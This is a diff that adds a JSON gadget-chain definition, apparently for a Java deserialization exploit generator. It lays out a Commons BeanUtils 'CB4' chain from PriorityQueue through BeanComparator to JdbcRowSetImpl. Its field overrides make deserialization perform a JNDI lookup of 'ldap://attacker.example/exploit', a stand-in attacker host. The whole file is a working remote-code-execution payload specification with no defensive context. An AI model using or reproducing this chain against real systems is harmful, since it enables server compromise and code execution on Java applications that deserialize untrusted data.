@@ -1,0 +1,21 @@
+{
+    "chain_type": "CB4 — PriorityQueue + BeanComparator → JdbcRowSetImpl JNDI (no TemplatesImpl, JDK 17+)",
+    "root_class": "java.util.PriorityQueue",
+    "root_trigger": "readObject→heapify→BeanComparator.compare→PropertyUtils.getProperty",
+    "links": [
+        {
+            "class": "org.apache.commons.beanutils.BeanComparator",
+            "field_overrides": {
+                "property": "databaseMetaData",
+                "comparator": null
+            }
+        },
+        {
+            "class": "com.sun.rowset.JdbcRowSetImpl",
+            "field_overrides": {
+                "dataSource": "ldap://attacker.example/exploit"
+            }
+        }
+    ],
+    "sink_method": "JdbcRowSetImpl.getDatabaseMetaData"
+}
